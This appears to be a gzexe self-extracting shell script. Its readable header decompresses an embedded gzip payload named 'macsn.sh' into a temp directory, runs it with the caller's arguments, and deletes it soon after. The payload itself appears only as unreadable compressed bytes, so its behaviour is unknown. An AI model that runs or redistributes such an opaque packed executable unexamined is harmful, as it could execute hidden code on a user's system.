#!/bin/sh
skip=49

tab='	'
nl='
'
IFS=" $tab$nl"

umask=`umask`
umask 77

gztmpdir=
trap 'res=$?
  test -n "$gztmpdir" && rm -fr "$gztmpdir"
  (exit $res); exit $res
' 0 1 2 3 5 10 13 15

case $TMPDIR in
  / | /*/) ;;
  /*) TMPDIR=$TMPDIR/;;
  *) TMPDIR=/tmp/;;
esac
if type mktemp >/dev/null 2>&1; then
  gztmpdir=`mktemp -d "${TMPDIR}gztmpXXXXXXXXX"`
else
  gztmpdir=${TMPDIR}gztmp$$; mkdir $gztmpdir
fi || { (exit 127); exit 127; }

gztmp=$gztmpdir/$0
case $0 in
-* | */*'
') mkdir -p "$gztmp" && rm -r "$gztmp";;
*/*) gztmp=$gztmpdir/`basename "$0"`;;
esac || { (exit 127); exit 127; }

case `printf 'X\n' | tail -n +1 2>/dev/null` in
X) tail_n=-n;;
*) tail_n=;;
esac
if tail $tail_n +$skip <"$0" | gzip -cd > "$gztmp"; then
  umask $umask
  chmod 700 "$gztmp"
  (sleep 5; rm -fr "$gztmpdir") 2>/dev/null &
  "$gztmp" ${1+"$@"}; res=$?
else
  printf >&2 '%s\n' "Cannot decompress $0"
  (exit 127); res=127
fi; exit $res
l¹`macsn.sh íV_OÓP¿âlV·»ö®q³*.Q4>ö]Xo¡-KôEE@ÉüoôAQ£ç1t'¾·£7
ê67Í¹çôüÎ¹§§=¿m!i2É. ¢L	I§ÅåKµùgµ»·Ü¥W+çfW+wÜëOÝ««å¥ÚÃóÕw·Ü÷Ý7W+óµ¹çî·8!¸²û²â©>Ý_~¿P½2Ûs8¢l7GÀ¨ß_ÐÓÛwl îïmim5[»f¶ug¨¡ßúÕ¬6W¢·çhOº/~²»ÿ`w«z5 ì"!c  1ÊA<
Dß0ãÔ`£v\3
ØN&%6Q,Bbßh2 ìç9ÙS !#§Ù¥
ÙLÞ^
Óuµ$%%(ÅÖ\§·qmæ@¶!º8ò!üqätÝ"¶
Ä²L+ÈuP¢¼iÁdÎÊÀÇõnz ¾«àg`ØâgÇ!9#{ºÅÃÙ? dü9] æ$¨4aØÌÀÊfÕ]'úà8aÃN	Û!ÂÖ½3G£TStoWvtÄb)N´bÎ" R/#­@´Q{ÂèPå©zi¨_NëU¡i³=ÑÙÕ+m"aèEÈv=á0m³¤@¸­Á/BÃ§Ä{ï7±Èx¯å,gK
b"@Ü\D|¤4æóÅ§dï	¹õúKúTÁfáé#ÇÔ°Ð5Â2Ð°(é¶&ì¯­Áá`¡bk>x³®®AvíÐðo§ù=òÛ$a:±â|Ô!R´É¿×ÿÛò/oKo²è@ój 3¯úSÙpô¡¢©*È26´²×Å§ÆôÃ'Ì¦ñqÞîtR¨d>v¼IZP»ê¥kîånùñjå|;¹ölÎ]x½rqÁ½ö²Î9­['B­ñÉ2MGòâ²8g?³ÅûèÕ×7Ë/Ñ/åÅÕWù=fBõÁbíÞ\õÞ¹ê¥jùvíÉ§ëôDêÜãÇ(zéGaóôxÌÑ
  
